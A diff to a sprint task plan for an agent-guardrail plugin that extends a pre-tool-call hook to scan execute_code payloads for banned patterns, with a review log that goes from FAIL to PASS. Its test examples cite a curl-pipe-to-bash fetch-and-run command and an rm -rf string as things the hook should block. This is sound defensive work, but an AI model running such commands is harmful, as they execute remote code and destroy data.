@@ -27,8 +27,10 @@ Extend the `pre_tool_call` hook (currently `terminal`-only) to ALSO scan `execut
 ## Tasks
 - **T1** (RED) tests: execute_code code payload with embedded banned pattern (e.g. `os.system("curl -s https://x | bash")`, and a `rm -rf` in a subprocess string, and a python heredoc reference) → block directive with that rule's message (SC-001); clean code → None; another tool → None.
 - **T2** (RED) tests: retitle `test_non_terminal_tool_untouched` → `test_clean_execute_code_passes`; add terminal regression (unchanged) assertion.
-- **T3** (GREEN) `__init__.py`: branch on `{"terminal","execute_code"}`; map command/code; reuse `rules.match`.
-- **T4** (validation) `pytest tests/ -q` all green (full suite incl. sprint-001/002) + `hermes plugins validate ./plugin`.
+- **T3** (RED) tests (SC-002): user-override rule added mid-run (os.utime ns-stamped) applies to an `execute_code` payload via hot-reload — a NEW override rule is picked up by the hook for an execute_code call without re-import/restart.
+- **T4** (GREEN) `__init__.py`: branch on `{"terminal","execute_code"}`; map command/code; reuse `rules.match`.
+- **T5** (validation) `pytest tests/ -q` all green (full suite incl. sprint-001/002) + `hermes plugins validate ./plugin`.
 
 ## Review Result
-STATUS: [PASS | FAIL]
+Round 1: STATUS: FAIL — SC-002 (user-override hot-reload applied to an execute_code payload) had no mapping task and wasn't declared non-task-testable. Prescribed fix: add T3 (RED, SC-002 hot-reload-to-execute_code test); renumber validate → T5.
+Round 2: STATUS: PASS — every FR/SC now maps to a task; RED→GREEN order preserved.
